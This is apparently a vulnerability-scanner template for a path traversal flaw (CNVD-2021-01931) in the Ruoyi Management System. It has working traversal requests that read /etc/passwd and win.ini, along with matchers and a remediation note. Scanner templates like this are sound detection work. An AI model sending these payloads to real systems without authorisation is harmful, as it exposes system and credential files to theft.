id: CNVD-2021-01931
info:
  name: Ruoyi Management System - Local File Inclusion
  author: daffainfo,ritikchaddha
  severity: high
  description: The Ruoyi Management System has a local file inclusion vulnerability
    which can be exploited by attackers to access any file in the system.
  reference:
  - https://disk.scan.cm/All_wiki/%E4%BD%A9%E5%A5%87PeiQi-WIKI-POC-2021-7-20%E6%BC%8F%E6%B4%9E%E5%BA%93/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md?hash=zE0KEPGJ
  tags: ruoyi,lfi,cnvd,cnvd2021
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  metadata:
    impact: The impact of the CNVD-2021-01931 vulnerability in the Ruoyi Management
      System is that it could enable attackers to access and potentially steal sensitive
      data from the operating system.
    recommendation: It is recommended that users of Ruoyi Management System update
      their software immediately to address the local file inclusion vulnerability
      and prevent attackers from accessing arbitrary files.
requests:
- method: GET
  path:
  - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd'
  - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini'
  matchers-condition: or
  matchers:
  - type: regex
    part: body
    regex:
    - root:.*:0:0
  - type: word
    part: body
    words:
    - bit app support
    - fonts
    - extensions
    condition: and
